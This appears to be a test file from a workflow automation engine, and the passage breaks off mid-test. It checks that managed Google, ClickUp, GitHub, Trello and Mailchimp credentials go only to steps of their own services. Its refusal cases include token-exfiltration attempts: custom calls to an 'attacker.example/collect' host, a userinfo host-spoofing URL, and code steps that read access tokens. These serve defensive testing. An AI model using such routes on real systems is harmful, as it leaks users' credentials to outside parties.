/**
 * A managed `jarvis:` connection belongs to the pieces of its source. Only a
 * step of one of those pieces may name it, and only as that step's `auth`.
 * Readiness refuses any other reference, and the engine's credential route
 * refuses to hand the credential to a run whose graph holds one, so a graph
 * that never went through readiness cannot reach the token either.
 */

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { CredentialResolver } from "../credentials/adapter";
import { JarvisGoogleConnectionSource } from "../credentials/google-source";
import { JarvisClickUpConnectionSource } from "../credentials/clickup-source";
import { JarvisMailchimpConnectionSource } from "../credentials/mailchimp-source";
import { JarvisGitHubConnectionSource } from "../credentials/github-source";
import { JarvisTrelloConnectionSource } from "../credentials/trello-source";
import { JarvisSlackConnectionSource } from "../credentials/slack-source";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { GoogleAuth } from "../../integrations/google-auth";
import { closeWorkflowDb, DEFAULT_IDS, getWorkflowDb, initWorkflowDb } from "../db";
import { setEncryptionKey } from "../db/encryption";
import { createFlow, setPublishedVersion } from "../db/repos/flow";
import { createDraftVersion, lockVersion, updateDraftVersion } from "../db/repos/flow-version";
import { createFlowRun } from "../db/repos/flow-run";
import { configureWorkflowReadiness, graphReadiness } from "../db/repos/flow-readiness";
import { triggerHookRunId } from "../runner/triggers/hook-run-id";
import { PieceCatalog } from "../runtime/piece-catalog";
import { graphDigest } from "../runtime/continuation";
import { SandboxApi } from "./server";

const ACCESS_TOKEN = "synthetic-managed-google-access-token";
const GMAIL = "@activepieces/piece-gmail";
const HTTP = "@activepieces/piece-http";
const SLACK = "@activepieces/piece-slack";
const CLICKUP = "@activepieces/piece-clickup";
const MAILCHIMP = "@activepieces/piece-mailchimp";
const GITHUB = "@activepieces/piece-github";
const TRELLO = "@activepieces/piece-trello";

const pieces = new PieceCatalog([
  { name: GMAIL, displayName: "Gmail", description: "", auth: { type: "OAUTH2" }, actions: {
    send_email: { name: "send_email", displayName: "", description: "", inputSchema: { fields: [
      { name: "subject", label: "", type: "string", required: false },
    ] } },
    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
      { name: "url", label: "", type: "json", required: false },
      { name: "method", label: "", type: "string", required: false },
    ] } },
  }, triggers: {
    new_email: { name: "new_email", displayName: "", description: "" },
  } },
  { name: HTTP, displayName: "HTTP", description: "", actions: {
    send_request: { name: "send_request", displayName: "", description: "", requireAuth: false, inputSchema: { fields: [
      { name: "headers", label: "", type: "json", required: false },
    ] } },
  } },
  { name: CLICKUP, displayName: "ClickUp", description: "", auth: { type: "OAUTH2" }, actions: {
    create_task: { name: "create_task", displayName: "", description: "", inputSchema: { fields: [
      { name: "name", label: "", type: "string", required: false },
    ] } },
    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
      { name: "url", label: "", type: "json", required: false },
      { name: "method", label: "", type: "string", required: false },
    ] } },
  } },
  { name: TRELLO, displayName: "Trello", description: "", auth: { type: "BASIC_AUTH" }, actions: {
    create_card: { name: "create_card", displayName: "", description: "", inputSchema: { fields: [
      { name: "name", label: "", type: "string", required: false },
    ] } },
    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
      { name: "url", label: "", type: "json", required: false },
      { name: "method", label: "", type: "string", required: false },
    ] } },
  } },
  { name: MAILCHIMP, displayName: "Mailchimp", description: "", auth: { type: "OAUTH2" }, actions: {
    find_subscriber: { name: "find_subscriber", displayName: "", description: "", inputSchema: { fields: [
      { name: "email", label: "", type: "string", required: false },
    ] } },
    // Not in the pinned 0.5.10 piece; here to pin what an empty host list means if a later version adds one.
    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
      { name: "url", label: "", type: "json", required: false },
      { name: "method", label: "", type: "string", required: false },
    ] } },
  } },
  { name: SLACK, displayName: "Slack", description: "", auth: { type: "OAUTH2" }, actions: {
    send_message: { name: "send_message", displayName: "", description: "" },
    slack_find_channel: { name: "slack_find_channel", displayName: "", description: "" },
    slack_get_channel_info: { name: "slack_get_channel_info", displayName: "", description: "" },
    slack_post_message: { name: "slack_post_message", displayName: "", description: "" },
    send_channel_message: { name: "send_channel_message", displayName: "", description: "" },
    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
      { name: "url", label: "", type: "json", required: false },
      { name: "method", label: "", type: "string", required: false },
    ] } },
  }, triggers: {
    new_message: { name: "new_message", displayName: "", description: "" },
  } },
  { name: GITHUB, displayName: "GitHub", description: "", auth: { type: "OAUTH2" }, actions: {
    github_create_issue: { name: "github_create_issue", displayName: "", description: "", inputSchema: { fields: [
      { name: "title", label: "", type: "string", required: false },
    ] } },
    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
      { name: "url", label: "", type: "json", required: false },
      { name: "method", label: "", type: "string", required: false },
    ] } },
    create_branch: { name: "create_branch", displayName: "", description: "" },
  }, triggers: {
    new_issue: { name: "new_issue", displayName: "", description: "" },
  } },
] as any);

const googleAuth = {
  isAuthenticated: () => true,
  reconnectRequired: () => null,
  getAccessToken: async () => ACCESS_TOKEN,
  getTokens: () => ({ access_token: ACCESS_TOKEN, refresh_token: "synthetic-grant", token_type: "Bearer" }),
} as unknown as GoogleAuth;

const empty = (nextAction?: any): any => ({ name: "trigger", type: "EMPTY", ...(nextAction ? { nextAction } : {}) });
const gmail = (input: Record<string, unknown> = { auth: "{{connections.jarvis:google}}" }, nextAction?: any): any => ({
  name: "send", type: "PIECE", settings: { pieceName: GMAIL, actionName: "send_email", input }, ...(nextAction ? { nextAction } : {}),
});
const code = (input: Record<string, unknown>, settings: Record<string, unknown> = {}): any => ({
  name: "calc", type: "CODE", settings: { sourceCode: { code: "export const code = async () => 1", packageJson: "{}" }, input, ...settings },
});
const http = (headers: unknown): any => ({ name: "call", type: "PIECE", settings: { pieceName: HTTP, actionName: "send_request", input: { headers } } });
const slack = (): any => ({ name: "post", type: "PIECE", settings: { pieceName: SLACK, actionName: "send_message", input: { auth: "{{connections.jarvis:google}}" } } });
const customCall = (url: unknown): any => ({ name: "call", type: "PIECE",
  settings: { pieceName: GMAIL, actionName: "custom_api_call", input: { auth: "{{connections.jarvis:google}}", method: "GET", url: { url } } } });
const gmailTrigger = (input: Record<string, unknown> = { auth: "{{connections.jarvis:google}}" }): any => ({ name: "trigger", type: "PIECE_TRIGGER",
  settings: { pieceName: GMAIL, triggerName: "new_email", input } });
const loop = (items: string): any => ({ name: "each", type: "LOOP_ON_ITEMS", settings: { items } });

/** Graphs where something other than a Gmail/Calendar/Drive/Sheets step's auth names the managed Google connection. */
const misuses: Array<[label: string, trigger: any]> = [
  ["a CODE step input", empty(code({ conn: "{{connections.jarvis:google}}" }))],
  ["a CODE step that claims a Google piece name for its auth", empty(code({ auth: "{{connections.jarvis:google}}" }, { pieceName: GMAIL }))],
  ["a CODE step nested input in bracket form", empty(code({ deep: { list: ["{{connections['jarvis:google']}}"] } }))],
  ["an HTTP step header", empty(http({ Authorization: "Bearer {{connections.jarvis:google}}" }))],
  ["the auth of another piece", empty(slack())],
  ["a non-auth input of a Gmail step", empty(gmail({ auth: "{{connections.jarvis:google}}", subject: "{{connections.jarvis:google}}" }))],
  ["a loop's items", empty(loop("{{connections.jarvis:google}}"))],
  ["a Gmail custom API call to another host", empty(customCall("https://attacker.example/collect"))],
  ["a Gmail custom API call to plain http on its own host", empty(customCall("http://gmail.googleapis.com/gmail/v1/users/me/profile"))],
  ["a Gmail custom API call whose host hides behind userinfo", empty(customCall("https://gmail.googleapis.com@attacker.example/x"))],
  ["a Gmail custom API call to another Google host", empty(customCall("https://www.googleapis.com/drive/v3/files"))],
  ["a Gmail custom API call whose URL is an expression", empty(customCall("{{trigger.url}}"))],
  ["a Gmail custom API call whose host is templated", empty(customCall("https://{{trigger.host}}/x"))],
  ["a Gmail custom API call whose host is completed by an expression", empty(customCall("https://gmail.googleapis.com{{trigger.rest}}"))],
  ["a Gmail custom API call whose scheme is completed by an expression", empty(customCall("h{{trigger.rest}}"))],
  ["a Gmail custom API call without a URL", empty(customCall(undefined))],
];

/** Custom API calls that stay on Gmail's own API host. */
const ownHostCalls: Array<[label: string, url: string]> = [
  ["a relative path", "/users/me/profile"],
  ["a templated relative path", "/users/{{trigger.user}}/messages"],
  ["an absolute URL on its own host", "https://gmail.googleapis.com/gmail/v1/users/me/profile"],
  ["an absolute URL on its own host with a templated path", "https://gmail.googleapis.com/gmail/v1/users/{{trigger.user}}"],
];

let api: SandboxApi;
let credentials: CredentialResolver;

beforeEach(async () => {
  initWorkflowDb(":memory:");
  setEncryptionKey(Buffer.alloc(32, 41));
  credentials = new CredentialResolver();
  credentials.register(new JarvisGoogleConnectionSource(googleAuth));
  configureWorkflowReadiness({ pieces, credentials });
  api = new SandboxApi({ services: { credentialResolver: credentials } });
  await api.start({ port: 0 });
});

afterEach(async () => {
  await api?.stop();
  closeWorkflowDb();
  setEncryptionKey(null);
});

const bindingIssues = (trigger: unknown) => {
  const flow = createFlow({});
  return graphReadiness(flow.id, trigger).issues.filter(i => i.code === "CONNECTION_BINDING" || i.code === "REFERENCE_SCOPE");
};

async function fetchFor(runId: string, externalId = "jarvis:google") {
  const identity = { projectId: DEFAULT_IDS.project, sandboxId: crypto.randomUUID(), runId };
  const { token, expiresAt } = await api.signer.mint(identity, 60);
  api.registry.register({ ...identity, engineToken: token, expiresAt, terminatedAt: null });
  return fetch(`${api.baseUrl}/v1/worker/app-connections/${encodeURIComponent(externalId)}?projectId=${DEFAULT_IDS.project}`,
    { headers: { Authorization: `Bearer ${token}` } });
}

function runOf(trigger: any, sampleInputOverride?: Record<string, Record<string, unknown>>): string {
  const flow = createFlow({});
  const version = createDraftVersion({ flowId: flow.id, displayName: "Scope", trigger });
  const run = createFlowRun({ flowId: flow.id, flowVersionId: version.id, status: "RUNNING" });
  // The digest the RUN_FLOW handler records before the engine starts.
  getWorkflowDb().run("UPDATE flow_run SET graph_digest = ? WHERE id = ?", [graphDigest(version.trigger), run.id]);
  if (sampleInputOverride) {
    // The frozen per-run config the worker writes before the engine starts.
    getWorkflowDb().run("UPDATE flow_run SET execution_config = ? WHERE id = ?", [JSON.stringify({ sampleInputOverride }), run.id]);
  }
  return run.id;
}

async function expectRefused(response: Response) {
  expect(response.status).toBe(403);
  expect(await response.text()).not.toContain(ACCESS_TOKEN);
}

describe("readiness: a managed connection is valid only as the auth of its own pieces", () => {
  test("a Gmail step's auth is ready", () => {
    expect(bindingIssues(empty(gmail()))).toEqual([]);
  });

  test("a Gmail trigger's auth is ready", () => {
    const trigger = { name: "trigger", type: "PIECE_TRIGGER", settings: { pieceName: GMAIL, triggerName: "new_email", input: { auth: "{{connections.jarvis:google}}" } } };
    expect(bindingIssues(trigger)).toEqual([]);
  });

  for (const [label, trigger] of misuses) {
    test(`${label} is not ready`, () => {
      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
    });
  }

  for (const [label, url] of ownHostCalls) {
    test(`a Gmail custom API call to ${label} is ready`, () => {
      expect(bindingIssues(empty(customCall(url)))).toEqual([]);
    });
  }

  test("the refusal names the pieces as people know them, and lists the piece names for tooling", () => {
    const [issue] = bindingIssues(empty(slack()));
    expect(issue!.message).toBe("Managed connection jarvis:google can only be used by Gmail, Google Calendar, Google Drive or Google Sheets steps");
    expect(issue!.allowedPieces).toEqual(["@activepieces/piece-gmail", "@activepieces/piece-google-calendar",
      "@activepieces/piece-google-drive", "@activepieces/piece-google-sheets"]);
  });
});

describe("runtime: the engine's credential route checks the run's own graph", () => {
  test("a run whose Gmail step names it as auth gets the token", async () => {
    const response = await fetchFor(runOf(empty(gmail())));
    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({ value: { access_token: ACCESS_TOKEN } });
  });

  for (const [label, trigger] of misuses) {
    test(`a run with ${label} referencing it is refused`, async () => {
      await expectRefused(await fetchFor(runOf(trigger)));
    });
  }

  test("a legitimate Gmail step does not cover a CODE step in the same graph", async () => {
    await expectRefused(await fetchFor(runOf(empty(gmail(undefined, code({ token: "{{connections['jarvis:google'].access_token}}" }))))));
    await expectRefused(await fetchFor(runOf(empty(gmail(undefined, code({ token: "{{connections.jarvis:google.access_token}}" }))))));
  });

  test("a sample input override that moves the reference into a CODE step is refused", async () => {
    await expectRefused(await fetchFor(runOf(empty(gmail(undefined, code({}))), { calc: { conn: "{{connections.jarvis:google}}" } })));
  });

  for (const [label, url] of ownHostCalls) {
    test(`a run with a Gmail custom API call to ${label} gets the token`, async () => {
      expect((await fetchFor(runOf(empty(customCall(url))))).status).toBe(200);
    });
  }

  test("a run is checked on the graph it began on: an edited draft, or no recorded graph, is refused", async () => {
    const flow = createFlow({});
    const version = createDraftVersion({ flowId: flow.id, displayName: "Scope", trigger: empty(code({})) });
    const run = createFlowRun({ flowId: flow.id, flowVersionId: version.id, status: "RUNNING" });
    await expectRefused(await fetchFor(run.id));
    getWorkflowDb().run("UPDATE flow_run SET graph_digest = ? WHERE id = ?", [graphDigest(version.trigger), run.id]);
    // The engine was handed a graph with a CODE step; the draft is then
    // edited to a clean Gmail graph while the run is going.
    updateDraftVersion(version.id, { trigger: empty(gmail()) });
    await expectRefused(await fetchFor(run.id));
  });

  test("a run whose graph never names it, or no run at all, is refused", async () => {
    await expectRefused(await fetchFor(runOf(empty(code({})))));
    await expectRefused(await fetchFor(crypto.randomUUID()));
  });

  test("a trigger hook of a flow with a Gmail trigger gets the token; one without is refused", async () => {
    const good = createFlow({});
    const goodVersion = createDraftVersion({ flowId: good.id, displayName: "Hook", trigger: gmailTrigger() });
    expect((await fetchFor(triggerHookRunId("poll", good.id, goodVersion))).status).toBe(200);
    const bad = createFlow({});
    const badVersion = createDraftVersion({ flowId: bad.id, displayName: "Hook", trigger: empty(gmail()) });
    await expectRefused(await fetchFor(triggerHookRunId("poll", bad.id, badVersion)));
  });

  test("a trigger hook is checked on the version it runs, not on another version of the flow", async () => {
    const flow = createFlow({});
    const published = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: gmailTrigger({
      auth: "{{connections.jarvis:google}}", label: "{{connections.jarvis:google}}" }) });
    lockVersion(published.id);
    // Published before readiness refused such a trigger (publishing checks
    // readiness now), so set directly.
    getWorkflowDb().run("UPDATE flow SET published_version_id = ? WHERE id = ?", [published.id, flow.id]);
    // An editable draft beside it has a valid Gmail trigger.
    const draft = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: gmailTrigger() });
    for (const kind of ["enable", "disable", "poll"] as const) {
      await expectRefused(await fetchFor(triggerHookRunId(kind, flow.id, published)));
      expect((await fetchFor(triggerHookRunId(kind, flow.id, draft))).status).toBe(200);
    }
    // A version of another flow is not one this hook runs.
    const other = createFlow({});
    await expectRefused(await fetchFor(triggerHookRunId("poll", other.id, draft)));
  });

  test("a published trigger that is valid gets the token", async () => {
    const flow = createFlow({});
    const published = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: gmailTrigger() });
    lockVersion(published.id);
    setPublishedVersion(flow.id, published.id);
    expect((await fetchFor(triggerHookRunId("poll", flow.id, published))).status).toBe(200);
  });

  test("a trigger hook of a draft whose trigger was edited after the hook began is refused", async () => {
    const flow = createFlow({});
    const misusing = gmailTrigger({ auth: "{{connections.jarvis:google}}", label: "{{connections.jarvis:google}}" });
    const draft = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: misusing });
    // The hook was handed the misusing trigger; the draft is then fixed.
    const runId = triggerHookRunId("poll", flow.id, draft);
    updateDraftVersion(draft.id, { trigger: gmailTrigger() });
    await expectRefused(await fetchFor(runId));
  });
});

describe("managed ClickUp is scoped to ClickUp steps", () => {
  const CLICKUP_TOKEN = "synthetic-managed-clickup-access-token";
  const ref = "{{connections.jarvis:clickup}}";
  let dataDir: string;
  beforeEach(() => {
    dataDir = mkdtempSync(join(tmpdir(), "clickup-scope-"));
    mkdirSync(join(dataDir, "connections"));
    writeFileSync(join(dataDir, "connections", "clickup.json"), JSON.stringify({ version: 1, provider: "clickup", status: "connected",
      generation: crypto.randomUUID(), access_token: CLICKUP_TOKEN, account: { id: "7", label: "owner" },
      workspaces: [{ id: "8", name: "Sandbox" }], connected_at: new Date().toISOString() }));
    credentials.register(new JarvisClickUpConnectionSource(dataDir));
  });
  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
  const task = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
    name: "create", type: "PIECE", settings: { pieceName: CLICKUP, actionName: "create_task", input }, ...(nextAction ? { nextAction } : {}),
  });
  const clickUpCall = (url: string): any => ({ name: "call", type: "PIECE",
    settings: { pieceName: CLICKUP, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
  const refused: Array<[string, any]> = [
    ["a CODE step input", empty(code({ conn: ref }))],
    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
    ["a Gmail step auth", empty(gmail({ auth: ref }))],
    ["a ClickUp step next to a CODE step that reads the token", empty(task(undefined, code({ token: "{{connections['jarvis:clickup'].access_token}}" })))],
    ["a ClickUp custom API call to another host", empty(clickUpCall("https://attacker.example/collect"))],
  ];
  for (const [label, trigger] of refused) {
    test(`${label} is not ready and the route refuses it`, async () => {
      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
      const response = await fetchFor(runOf(trigger), "jarvis:clickup");
      expect(response.status).toBe(403);
      expect(await response.text()).not.toContain(CLICKUP_TOKEN);
    });
  }
  test("the refusal names ClickUp", () => {
    const [issue] = bindingIssues(empty(code({ conn: ref })));
    expect(issue!.message).toBe("Managed connection jarvis:clickup can only be used by ClickUp steps");
    expect(issue!.allowedPieces).toEqual([CLICKUP]);
  });
  test("a ClickUp step auth, or a custom API call on api.clickup.com, is ready and resolves", async () => {
    for (const trigger of [empty(task()), empty(clickUpCall("https://api.clickup.com/api/v2/user")), empty(clickUpCall("/user"))]) {
      expect(bindingIssues(trigger)).toEqual([]);
      const response = await fetchFor(runOf(trigger), "jarvis:clickup");
      expect(response.status).toBe(200);
      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: CLICKUP, value: { access_token: CLICKUP_TOKEN } });
    }
  });
});

describe("managed GitHub is scoped to GitHub steps", () => {
  const GITHUB_TOKEN = "synthetic-managed-github-access-token";
  const ref = "{{connections.jarvis:github}}";
  let dataDir: string;
  beforeEach(() => {
    dataDir = mkdtempSync(join(tmpdir(), "github-scope-"));
    mkdirSync(join(dataDir, "connections"));
    writeFileSync(join(dataDir, "connections", "github.json"), JSON.stringify({ version: 1, provider: "github", status: "connected",
      generation: crypto.randomUUID(), access_token: GITHUB_TOKEN, account: { id: "1", label: "octocat" },
      workspaces: [], connected_at: new Date().toISOString() }));
    credentials.register(new JarvisGitHubConnectionSource(dataDir));
  });
  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
  const create = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
    name: "create", type: "PIECE", settings: { pieceName: GITHUB, actionName: "github_create_issue", input }, ...(nextAction ? { nextAction } : {}),
  });
  const githubTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
    settings: { pieceName: GITHUB, triggerName: "new_issue", input: { auth: ref }, ...extra } });
  const githubCall = (url: string): any => ({ name: "call", type: "PIECE",
    settings: { pieceName: GITHUB, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
  const refused: Array<[string, any]> = [
    ["a CODE step input", empty(code({ conn: ref }))],
    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
    ["a Gmail step auth", empty(gmail({ auth: ref }))],
    ["a GitHub step next to a CODE step that reads the token", empty(create(undefined, code({ token: "{{connections['jarvis:github'].access_token}}" })))],
    ["a GitHub custom API call to another host", empty(githubCall("https://attacker.example/collect"))],
    ["a GitHub custom API call to plain http on its own host", empty(githubCall("http://api.github.com/user"))],
    ["a GitHub custom API call to github.com instead of its API host", empty(githubCall("https://github.com/login"))],
    // Defense in depth: only the five managed issue actions get the token, even on GitHub's own API host.
    ["a GitHub custom API call to a path under its API", empty(githubCall("/user"))],
    ["a GitHub custom API call on api.github.com", empty(githubCall("https://api.github.com/user"))],
    ["a GitHub action outside the managed issue actions", empty({ name: "branch", type: "PIECE", settings: { pieceName: GITHUB, actionName: "create_branch", input: { auth: ref } } })],
    ["a GitHub trigger", githubTrigger()],
    ["a GitHub trigger that also carries a managed actionName", githubTrigger({ actionName: "github_create_issue" })],
  ];
  for (const [label, trigger] of refused) {
    test(`${label} is not ready and the route refuses it`, async () => {
      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
      const response = await fetchFor(runOf(trigger), "jarvis:github");
      expect(response.status).toBe(403);
      expect(await response.text()).not.toContain(GITHUB_TOKEN);
    });
  }
  test("the refusal names GitHub", () => {
    const [issue] = bindingIssues(empty(code({ conn: ref })));
    expect(issue!.message).toBe("Managed connection jarvis:github can only be used by GitHub steps");
    expect(issue!.allowedPieces).toEqual([GITHUB]);
    const [call] = bindingIssues(empty(githubCall("https://api.github.com/user")));
    expect(call!.message).toBe("This GitHub connection does not support this action or trigger yet");
  });
  test("a trigger hook of a GitHub trigger is refused the token", async () => {
    for (const trigger of [githubTrigger(), githubTrigger({ actionName: "github_create_issue" })]) {
      const flow = createFlow({});
      const version = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger });
      const response = await fetchFor(triggerHookRunId("poll", flow.id, version), "jarvis:github");
      expect(response.status).toBe(403);
      expect(await response.text()).not.toContain(GITHUB_TOKEN);
    }
  });
  test("every managed GitHub issue action's auth passes the connection scope and resolves", async () => {
    for (const actionName of ["github_create_issue", "getIssueInformation", "update_issue", "find_issue", "createCommentOnAIssue"]) {
      const trigger = empty({ name: "step", type: "PIECE", settings: { pieceName: GITHUB, actionName, input: { auth: ref } } });
      if (actionName === "github_create_issue") expect(bindingIssues(trigger)).toEqual([]);
      const response = await fetchFor(runOf(trigger), "jarvis:github");
      expect(response.status).toBe(200);
      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: GITHUB, value: { access_token: GITHUB_TOKEN, jarvis_managed: "github" } });
    }
  });
});

describe("managed Trello is scoped to Trello steps", () => {
  const TRELLO_TOKEN = "synthetic-managed-trello-user-token";
  const ref = "{{connections.jarvis:trello}}";
  let dataDir: string;
  beforeEach(() => {
    dataDir = mkdtempSync(join(tmpdir(), "trello-scope-"));
    mkdirSync(join(dataDir, "connections"));
    writeFileSync(join(dataDir, "connections", "trello.json"), JSON.stringify({ version: 1, provider: "trello", status: "connected",
      generation: crypto.randomUUID(), access_token: TRELLO_TOKEN, settings: { api_key: "synthetic-public-key" },
      account: { id: "a".repeat(24), label: "owner" }, workspaces: [], connected_at: new Date().toISOString() }));
    credentials.register(new JarvisTrelloConnectionSource(dataDir));
  });
  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
  const card = (input: Record<string, unknown> = { auth: ref }, nextAction?: any, actionName = "create_card"): any => ({
    name: "card", type: "PIECE", settings: { pieceName: TRELLO, actionName, input }, ...(nextAction ? { nextAction } : {}),
  });
  const trelloTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
    settings: { pieceName: TRELLO, triggerName: "new_card", input: { auth: ref }, ...extra } });
  const trelloCall = (url: string): any => ({ name: "call", type: "PIECE",
    settings: { pieceName: TRELLO, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
  const refused: Array<[string, any]> = [
    ["a CODE step input", empty(code({ conn: ref }))],
    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
    ["a Gmail step auth", empty(gmail({ auth: ref }))],
    ["a Trello step next to a CODE step that reads the token", empty(card(undefined, code({ token: "{{connections['jarvis:trello'].password}}" })))],
    ["a Trello custom API call to another host", empty(trelloCall("https://attacker.example/collect"))],
    // The managed connection runs only its qualified actions; the engine would refuse these too.
    ["a Trello custom API call on api.trello.com", empty(trelloCall("https://api.trello.com/1/members/me"))],
    ["a Trello action outside the managed set", empty(card({ auth: ref }, undefined, "delete_card"))],
    ["a Trello trigger", trelloTrigger()],
    ["a Trello trigger carrying a stray qualified actionName", trelloTrigger({ actionName: "create_card" })],
    ["a Trello step carrying a stray triggerName", empty({ ...card(), settings: { ...card().settings, triggerName: "new_card" } })],
  ];
  for (const [label, trigger] of refused) {
    test(`${label} is not ready and the route refuses it`, async () => {
      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
      const response = await fetchFor(runOf(trigger), "jarvis:trello");
      expect(response.status).toBe(403);
      expect(await response.text()).not.toContain(TRELLO_TOKEN);
    });
  }
  test("the refusal names Trello", () => {
    const [issue] = bindingIssues(empty(code({ conn: ref })));
    expect(issue!.message).toBe("Managed connection jarvis:trello can only be used by Trello steps");
    expect(issue!.allowedPieces).toEqual([TRELLO]);
  });
  test("a refused Trello trigger or action says the connection does not support it", () => {
    for (const trigger of [trelloTrigger(), trelloTrigger({ actionName: "create_card" }), empty(card({ auth: ref }, undefined, "delete_card"))]) {
      expect(bindingIssues(trigger).map(i => i.message)).toContain("This Trello connection does not support this action or trigger yet");
    }
  });
  test("a Trello step auth on a qualified action passes the connection scope and resolves", async () => {
    for (const actionName of ["list_boards", "list_lists", "get_card", "create_card", "move_card"]) {
      const trigger = empty(card({ auth: ref }, undefined, actionName));
      expect(bindingIssues(trigger)).toEqual([]);
      const response = await fetchFor(runOf(trigger), "jarvis:trello");
      expect(response.status).toBe(200);
      expect(await response.json()).toMatchObject({ type: "BASIC_AUTH", pieceName: TRELLO, value: { password: TRELLO_TOKEN } });
    }
  });
});

describe("managed Mailchimp is scoped to Mailchimp steps", () => {
  const MAILCHIMP_TOKEN = "synthetic-managed-mailchimp-access-token";
  const ref = "{{connections.jarvis:mailchimp}}";
  let dataDir: string;
  beforeEach(() => {
    dataDir = mkdtempSync(join(tmpdir(), "mailchimp-scope-"));
    mkdirSync(join(dataDir, "connections"));
    writeFileSync(join(dataDir, "connections", "mailchimp.json"), JSON.stringify({ version: 1, provider: "mailchimp", status: "connected",
      generation: crypto.randomUUID(), access_token: MAILCHIMP_TOKEN, settings: { server_prefix: "us1" },
      account: { id: "account1", label: "owner" }, workspaces: [], connected_at: new Date().toISOString() }));
    credentials.register(new JarvisMailchimpConnectionSource(dataDir));
  });
  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
  const find = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
    name: "find", type: "PIECE", settings: { pieceName: MAILCHIMP, actionName: "find_subscriber", input }, ...(nextAction ? { nextAction } : {}),
  });
  const mailchimpTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
    settings: { pieceName: MAILCHIMP, triggerName: "subscribe", input: { auth: ref }, ...extra } });
  const mailchimpCall = (url: string): any => ({ name: "call", type: "PIECE",
    settings: { pieceName: MAILCHIMP, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
  const refused: Array<[string, any]> = [
    ["a CODE step input", empty(code({ conn: ref }))],
    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
    ["a Gmail step auth", empty(gmail({ auth: ref }))],
    ["a Mailchimp step next to a CODE step that reads the token", empty(find(undefined, code({ token: "{{connections['jarvis:mailchimp'].access_token}}" })))],
    // No fixed host: even the account's own data center is only reachable as a path.
    ["a Mailchimp custom API call to a full URL", empty(mailchimpCall("https://us1.api.mailchimp.com/3.0/ping"))],
    // Only the five managed actions get the token, so not even a path is reachable.
    ["a Mailchimp custom API call by path", empty(mailchimpCall("/ping"))],
    ["a Mailchimp action outside the managed actions", empty({ name: "send", type: "PIECE", settings: { pieceName: MAILCHIMP, actionName: "send_campaign", input: { auth: ref } } })],
    ["a Mailchimp step that also carries a triggerName", empty({ name: "find", type: "PIECE", settings: { pieceName: MAILCHIMP, actionName: "find_subscriber", triggerName: "subscribe", input: { auth: ref } } })],
    ["a Mailchimp trigger", mailchimpTrigger()],
    ["a Mailchimp trigger that also carries a managed actionName", mailchimpTrigger({ actionName: "find_subscriber" })],
  ];
  for (const [label, trigger] of refused) {
    test(`${label} is not ready and the route refuses it`, async () => {
      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
      const response = await fetchFor(runOf(trigger), "jarvis:mailchimp");
      expect(response.status).toBe(403);
      expect(await response.text()).not.toContain(MAILCHIMP_TOKEN);
    });
  }
  test("the refusal names Mailchimp", () => {
    const [issue] = bindingIssues(empty(code({ conn: ref })));
    expect(issue!.message).toBe("Managed connection jarvis:mailchimp can only be used by Mailchimp steps");
    expect(issue!.allowedPieces).toEqual([MAILCHIMP]);
    const [call] = bindingIssues(empty(mailchimpCall("/ping")));
    expect(call!.message).toBe("This Mailchimp connection does not support this action or trigger yet");
  });
  test("a trigger hook of a Mailchimp trigger is refused the token", async () => {
    for (const trigger of [mailchimpTrigger(), mailchimpTrigger({ actionName: "find_subscriber" })]) {
      const flow = createFlow({});
      const version = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger });
      const response = await fetchFor(triggerHookRunId("poll", flow.id, version), "jarvis:mailchimp");
      expect(response.status).toBe(403);
      expect(await response.text()).not.toContain(MAILCHIMP_TOKEN);
    }
  });
  test("every managed Mailchimp action's auth passes the connection scope and resolves", async () => {
    for (const actionName of ["find_subscriber", "add_subscriber_to_tag", "remove_subscriber_from_tag", "find_campaign", "get_campaign_report"]) {
      const trigger = empty({ name: "step", type: "PIECE", settings: { pieceName: MAILCHIMP, actionName, input: { auth: ref } } });
      expect(bindingIssues(trigger)).toEqual([]);
      const response = await fetchFor(runOf(trigger), "jarvis:mailchimp");
      expect(response.status).toBe(200);
